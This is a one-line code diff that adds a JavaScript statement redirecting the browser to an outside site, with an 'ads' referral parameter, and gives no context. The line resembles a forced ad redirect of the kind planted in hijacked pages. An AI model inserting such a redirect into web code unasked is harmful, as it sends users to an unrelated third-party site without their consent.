@@ -1,0 +1,1 @@
+window.location.href='http://www.51mfxs.com/?type=1&ref=ads';
